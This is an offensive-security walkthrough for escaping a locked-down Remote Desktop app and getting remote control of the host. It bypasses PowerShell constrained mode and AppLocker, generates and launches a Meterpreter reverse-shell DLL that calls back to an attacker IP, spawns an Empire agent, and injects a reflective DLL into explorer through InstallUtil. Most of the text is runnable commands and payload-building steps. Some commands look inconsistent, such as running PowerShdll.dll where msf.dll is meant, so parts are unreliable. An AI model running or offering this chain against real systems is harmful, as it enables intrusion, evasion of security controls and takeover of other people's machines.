# From RDS app to Empire shell
This article details a scenario where you only have access to a Remote Desktop Service. This effectively atttemps to lock you to one application one, much similar to Citrix seen in corporate environments.
Additionally this scenario has Applocker on the target box, Powershell is in Language Constrained Mode which prevents many powershell tricks from being used. On top of that Windows Defender is eating your shells.

**Requirements:**
* The RDS server does not block port 80 outbound.
* .Net v3.5 for dll mode in PowerShdll

**Important notes**
powershell.exe _is_ not Powershell. It just hosts the assembly that contains PowerShell and handles I/O. System.Management.Automation.dll
Learn more from the links at the bottom of this article.

#### Getting shell from RDS notepad
https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/

From the notepad app
Click Help -> View help -> triggers Internet Explorer
Right click on anything -> save target as -> save as lol.ps1 on the Desktop
Press view downloads in IE, press the dropdown on the file, open with -> notepad. then just write powershell.exe in the file and save again
Now right click -> "save target as" in IE again. Go to the dropdown "save as type" and select "all files". The ps1-file you have saved will be revealed and you can just press "run with powershell" and a powershell prompt should pop up. This shell should be in Constrained mode. Verify with `$ExecutionContext.SessionState.LanguageMode`, which should say `ConstrainedLanguage`.

#### Bypssing PoSh constrained mode
Download PowerShdll
https://github.com/p3nt4/PowerShdll
Now go to IE again, host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`
Navigate to the following URL in IE where http://10.7.253.10/PowerShdll.dll
Save as -> PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. I'm not sure exactly how to check for DLL rules in an Applocked environment yet.
Now navigate to the desktop in the other powershell prompt
Use rundll32 to execute the dll
`rundll32 .\PowerShdll.dll,main -w`
A new interactive powershell prompt should pop up
Verify that constrained language mode has been bypassed with
$ExecutionContext.SessionState.LanguageMode
It should say FullLanguage

#### Getting meterpreter shell
Generate a dll payload
```
msfvenom windows/x64/meterpreter/reverse_tcp lhost=10.7.253.10 lport=8081 -f dll -o msf.dll
```
Set up listener in msf with same payload, host and port.

```
use multi/handler
set host tun0
set port 8081
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Download the msf.dll using the IE "save as" trick from before. For some reason I am not sure the dll payload is not taken by Windows Defender, not on disk and not when executed.
Now, use rundll32 to execute the dll. We use this because rundll32 is a binary that will not be blocked by Applocker.

`rundll32 .\PowerShdll.dll,Control_RunDLL`

Shell should now spawn in msf.

#### Empire without powershell.exe
This assumes you have a metasploit Session established.
In Empire, create an empire listener and stager. The important things is to set Base64 to false to prevent the stager from calling powershell.exe, which won't work here because of the constrained language mode.
```
uselistener http
set Host 10.7.253.18
set Port 4444
execute
back
usestager multi/launcher
set Base64 false
generate
```

Now in MSF:
```
load powershell
powershell_shell
```
Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire. Congratulations!




## More advanced technique

#### Bypassing powershell constrained mode and applocker
This technique involves packing everything together several times to bypass all the security mechanisms. I recommend reading the article below and trying to replicate each step. Albeit, I have made a step by step overview of it below.
https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell

1 Generate a listener and a hta stager using windows/hta

2 Open ReflectivePick project in visual studio. Add the hta base64 shell stager where appropriate and compile the dll to `ReflectivePick_x64.dll`

3 Use the following commands in PS to encode the DLL to base64 and pipe the results to a file
```
$Content = Get-Content .\ReflectivePick_x64.dll -Encoding Byte
$Encoded = [System.Convert]::ToBase64String($Content)
$Encoded | Out-File "C:\Windows\Tasks\dll.txt"
```


4 Copypaste the content of dll.txt into a new variable in Invoke-ReflectivePEInjection.ps1
```
$dllData = "DLLBASE64_GOES_HERE"
$ProcId = (Get-Process explorer).Id
$Bytes = [System.Convert]::FromBase64String($dllData)
Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId
```


5 Base64 encode the entire script using https://www.base64encode.org/
Open the Bypass project in VS and copypaste the base64 into the encoded variable.
Compile to Bypass.exe with VS.

6 Use installutil.exe to execute bypass.exe

```
set-location \\tsclient\lkylabs
copy-item .\Bypass.exe c:\windows\tasks
cd c:\windows\tasks
C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
```


### Useful links

https://www.youtube.com/watch?v=czJrXiLs0wM
https://adsecurity.org/?p=2921
https://bneg.io/2017/07/26/empire-without-powershell-exe/
https://artofpwn.com/offensive-and-defensive-powershell-ii.html
https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell
https://github.com/caseysmithrc/DeviceGuardBypasses
https://github.com/Joshua1909/AllTheThings
https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html

